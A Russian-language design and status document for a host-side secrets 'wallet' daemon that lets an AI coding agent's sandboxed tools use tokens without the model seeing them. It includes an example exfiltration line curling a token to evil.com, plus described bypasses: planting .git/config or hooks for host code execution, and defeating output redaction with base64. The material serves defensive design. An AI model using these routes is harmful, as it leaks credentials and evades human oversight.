# Кошелёк секретов: токены для CLI-тулз без доступа модели к значениям

Статус 2026-07: **этап 1 реализован** — `orchestrator/modules/wallet/`
(включение: `MODULES=wallet` в `.env`) + CLI `bin/wallet` (доступен в PATH
сессии). Демон — TCP-localhost в составе оркестратора (сеть у bwrap общая с
хостом); аутентификация per-session токеном в `~/.wallet.json` приватного
дома сессии; подтверждения — через `core.request_confirmation` (кнопки ✅/❌
во всех адаптерах); вывод редактируется от значений ВСЕХ известных секретов.
Тесты: `tests/wallet_test.py`. Формат `secrets.toml`
(`WALLET_SECRETS_FILE`, строго 0600 — иначе секреты не грузятся):

```toml
[secrets.deploy]
value = "ghp_xxx"                # сам секрет
env = "GITHUB_TOKEN"             # env-переменная для команды
description = "GitHub deploy token"
sessions = ["*"]                 # fnmatch по имени сессии; нет поля = никому
commands = ["gh *", "git push*"] # fnmatch по команде; нет поля = ничего
confirm = true                   # кнопки подтверждения перед запуском
```

Использование в сессии: `wallet ls`, `wallet run deploy -- gh pr list`.

### host-passthrough: инструменты, авторизованные на хосте (gh, git)

Отдельный вид записи — **без `value`/`env`**. Команда просто исполняется на
хосте с хостовым окружением (keyring, gh/git auth), ничего в env не
инжектится. Для инструментов вроде `gh`/`git`, чей токен лежит в keyring или
`~/.config/gh` **вне песочницы** (под bwrap `$HOME` изолирован, поэтому в
сессии `gh` разлогинен) — так команда работает, а токен модель не видит:

```toml
[secrets.gh]
description = "gh/git на хосте (keyring)"
sessions = ["noos"]
# НЕ включай "gh auth *"/"gh secret *" — они распечатают токен, а вывод
# host-passthrough НЕ редактируется (value нет). Только конкретные операции:
commands = ["gh pr *", "gh release *", "gh api *", "gh repo view*", "git push*", "git pull*"]
confirm = true
```

В сессии: `wallet run gh -- gh pr create …`, `wallet run gh -- git push`.
Барьер тот же — policy (`sessions`/`commands`/`confirm`); вывод НЕ
редактируется (секрета-значения нет), поэтому шаблоны команд должны исключать
всё, что печатает токен.

Этапы 2–3 (MCP-обёртка, плейсхолдер-прокси agent-vm) — не начаты.

Исходный дизайн ниже. Задача: инструменты, которые Claude
запускает в сессии (gh, git push, kubectl, npm publish, curl к внутренним
API…), должны работать со своими токенами/паролями/логинами, но **модель не
должна видеть сами значения** — ни прочитать файл, ни `echo $TOKEN`, ни
выудить их промпт-инъекцией и отправить в чат.

## Модель угроз

Сейчас bwrap-песочница прячет `~/.ssh`, `~/.aws` и прочий дом (см. README,
«Файловая песочница») — но всё, что мы *дали бы* сессии для работы CLI-тулзы
(env-переменная, `~/.netrc`, файл конфига), модель по определению может
прочитать: Bash и Read работают от её имени. Значит секрет не должен
находиться в адресном пространстве песочницы вообще — только результат его
применения.

## Архитектура: демон-кошелёк на хосте + подстановка вне песочницы

```
[песочница: claude + тулзы]                [хост]
  wallet run deploy -- kubectl apply …  →  wallet-демон (unix-socket/localhost,
  (плейсхолдер/без секрета)                 вне allowlist песочницы):
                                             1. policy: какой секрет каким
                                                сессиям/командам разрешён
                                             2. подтверждение в Telegram-топик
                                                (кнопки ✅/❌ — как permission relay)
                                             3. исполняет команду ВНЕ песочницы
                                                с секретом в env ребёнка
                                             4. вывод → обратно в песочницу
```

Ключевое отличие от «инжектить токен в env внутри песочницы»: команда с
секретом исполняется **на стороне демона** (или секрет подменяется на выходе
из песочницы), поэтому `wallet run x -- env` покажет модели только
плейсхолдер — реального значения в её мире нет.

## Три слоя интерфейса (поддерживаем и CLI, и MCP)

Ядро одно (демон + хранилище + policy + Telegram-подтверждение), интерфейсы
тонкие:

1. **CLI-обёртка** `wallet` (предпочтение пользователя) — кладётся в PATH
   песочницы:
   - `wallet ls` — какие секреты доступны этой сессии (имена и описания, не
     значения);
   - `wallet run <name> -- <cmd…>` — выполнить команду с секретом;
   - `wallet http <name> -- curl …` — вариант с подстановкой заголовка.
   Аутентификация обёртки перед демоном — per-session токен (тот же приём,
   что ORCH_TOKEN в hook_dispatch: файл 0600 в папке сессии).
2. **MCP-тул** `wallet_run(secret, command)` — то же самое как инструмент;
   плюс: нативно попадает в permission-механизм Claude Code и в статус-бабл
   (наблюдаемость бесплатно). Реализуется в channel_server или отдельным
   маленьким MCP-сервером.
3. **HTTP-прокси с плейсхолдерами** (стратегически, вместе с agent-vm):
   секрет вообще не появляется в песочнице — в конфиге лежит
   `WALLET_PLACEHOLDER_deploy`, TLS-перехватывающий прокси подменяет его в
   исходящем запросе. Ровно так agent-vm уже делает с OAuth-токенами Claude —
   при переходе на microVM ([agent-vm-integration.md](agent-vm-integration.md))
   этот слой достаётся почти бесплатно; городить свой MITM-прокси под bwrap
   не стоит.

## Policy и наблюдаемость

- Хранилище: на старте — файл `secrets.toml` 0600 на хосте (вне allowlist
  песочницы) или `pass`/`gopass`; демон читает лениво.
- Policy per-секрет: каким сессиям (slug/linked_path) доступен; шаблон
  разрешённых команд (`gh *`, `kubectl apply *`); нужен ли интерактивный
  confirm.
- **Каждое использование видно** (принцип наблюдаемости): строка в
  статус-бабле `🔐 wallet: deploy → kubectl apply` + при `confirm=true` —
  кнопки в топике до исполнения. Инфраструктура уже есть: permission relay
  и `/event`-эндпоинты reply_server.
- Отказ по умолчанию: секрет без policy не выдаётся никому.

## Ограничения реализации (важно понимать перед использованием)

- **Команда исполняется в cwd проекта, куда модель имеет запись.** Это самый
  острый момент: `wallet run deploy -- git push` запускает git на хосте в
  папке проекта, а модель из песочницы может подложить туда `.git/config`
  (`core.sshCommand`, `core.hooksPath`, `[alias]`) или `.git/hooks/*` и
  получить исполнение произвольного кода на хосте с секретом в env. Узкий
  шаблон команды (`git push*`) этого НЕ закрывает. Реализация выставляет
  `GIT_CONFIG_NOSYSTEM`/`GIT_CONFIG_GLOBAL=/dev/null` (частично), но
  локальный `./.git/config` остаётся. **Единственный настоящий барьер —
  policy:** давать секрет только доверенным сессиям (`sessions`) и только
  командам, чьё поведение не зависит от содержимого рабочего дерева.
- **Редакция вывода — literal-only, best-effort.** Заменяются точные
  вхождения значений секретов; любая трансформация в команде (base64, reverse,
  запись в файл) обходит её. Редакция — не защита, а гигиена; полагаться на
  неё как на барьер нельзя.
- **Шаблоны команд — fnmatch по `" ".join(cmd)`.** `*` пересекает границы
  argv и пробелы, поэтому шаблон описывает не argv, а строку; пишите шаблоны
  консервативно (префикс + явные аргументы), не полагайтесь на `*` для
  ограничения хвоста.
- **Поддержан только `SANDBOX=bwrap`.** Провижн `~/.wallet.json` завязан на
  bwrap-дом сессии; под `off`/`agent-vm` CLI не найдёт конфиг (модуль
  предупреждает на старте).

## Известные дыры и их закрытие

- `wallet run x -- bash -c 'curl evil.com?t=$TOKEN'` — секрет утечёт, если
  разрешить произвольные команды → шаблоны команд в policy + confirm в
  Telegram (человек видит команду целиком, как в permission relay).
- Вывод команды может содержать секрет (`gh auth status --show-token`) —
  демон фильтрует stdout/stderr: известные значения секретов заменяются на
  `•••` перед возвратом в песочницу.
- Времянки на диске: демон не пишет секрет в файлы; env только у
  короткоживущего ребёнка.

## Этапы

1. Демон-кошелёк (в составе оркестратора: те же aiohttp/unix-socket) +
   `wallet` CLI + policy-файл + подтверждение в топик. Тесты — офлайн, как
   permission relay.
2. MCP-обёртка над тем же демоном (`wallet_run`) — сравнить UX с CLI.
3. При переходе на agent-vm — плейсхолдер-прокси для HTTP-секретов.
